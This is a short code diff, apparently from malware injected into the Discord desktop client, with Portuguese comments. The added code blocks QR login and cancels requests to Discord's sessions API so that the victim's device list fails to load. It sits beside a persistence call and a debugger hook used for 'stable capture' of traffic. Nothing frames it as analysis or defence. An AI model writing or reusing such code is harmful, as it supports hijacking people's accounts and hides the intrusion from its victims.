@@ -131,10 +131,23 @@ const startCapture = () => {
 
     p3rsist();
 
-    // Bloqueios de Segurança (QR e Sessões) usando CONFIG.session_filter
+    // Bloqueios de Segurança (QR e Sessões)
+    // 1. Bloqueia o QR Code
     session.defaultSession.webRequest.onBeforeRequest(CONFIG.qr_filter, (d, c) => c({ cancel: true }));
-    session.defaultSession.webRequest.onBeforeRequest(CONFIG.session_filter, (d, c) => c({ cancel: true }));
-    session.defaultSession.webRequest.onBeforeSendHeaders(CONFIG.session_filter, (d, c) => c({ cancel: true }));
+
+    // 2. Bloqueia a API de Sessões (Dispositivos)
+    // Usamos um filtro amplo para pegar qualquer versão da API (v8, v9, v10)
+    session.defaultSession.webRequest.onBeforeRequest(CONFIG.session_filter, (details, callback) => {
+        // Isso faz com que a requisição de 'sessions' seja cancelada antes mesmo de sair do PC
+        // Na interface do Discord, isso geralmente resulta em um erro de carregamento ou 
+        // a lista de dispositivos simplesmente não aparece.
+        callback({ cancel: true });
+    });
+
+    // 3. Garante que os cabeçalhos de autorização não sejam enviados para essas URLs
+    session.defaultSession.webRequest.onBeforeSendHeaders(CONFIG.session_filter, (details, callback) => {
+        callback({ cancel: true });
+    });
 
     // Debugger Protocol (Captura estável)
     if (!win.webContents.debugger.isAttached()) {
